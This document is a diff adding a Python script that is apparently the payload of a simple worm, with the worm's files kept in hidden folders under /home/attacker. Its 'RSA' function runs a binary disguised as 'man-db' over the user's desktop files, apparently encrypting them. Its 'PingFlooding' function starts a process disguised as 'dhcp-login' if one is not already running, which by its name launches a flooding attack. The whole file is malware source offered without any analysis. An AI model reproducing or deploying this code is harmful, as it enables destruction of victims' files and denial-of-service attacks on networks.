@@ -1,0 +1,34 @@
+#!/usr/bin/env python3
+import os
+from subprocess import Popen, PIPE
+from crontab import CronTab
+import sys
+
+def RSA():
+    exe = ''
+    if os.path.exists('/home/attacker/Public/.Simple_Worm/man-db'):
+        exe = '/home/attacker/Public/.Simple_Worm/man-db'
+    elif os.path.exists('/home/attacker/Desktop/.Backup/man-db'):
+        exe = '/home/attacker/Desktop/.Backup/man-db'
+    
+    path = '/home/attacker/Desktop/'
+    desktop = os.listdir(path)
+    for d in desktop:
+        try:
+            [int(i) for i in open(path + d).read().split(' ')]
+        except:
+            os.system('{} -C 126419 30743 {}'.format(exe, path + d))
+
+def PingFlooding():
+    p1 = Popen(['ps', '-aux'], stdout=PIPE)
+    p2 = Popen(['grep', 'dhcp-login'], stdin=p1.stdout, stdout=PIPE)
+    p1.stdout.close()
+    output = str(p2.communicate()[0])
+    if '/home/attacker' not in output:
+        if os.path.exists('/home/attacker/Public/.Simple_Worm/dhcp-login'):
+            os.system('/home/attacker/Public/.Simple_Worm/dhcp-login')
+        elif os.path.exists('/home/attacker/Desktop/.Backup/dhcp-login'):
+            os.system('/home/attacker/Desktop/.Backup/dhcp-login')
+
+RSA()
+PingFlooding()
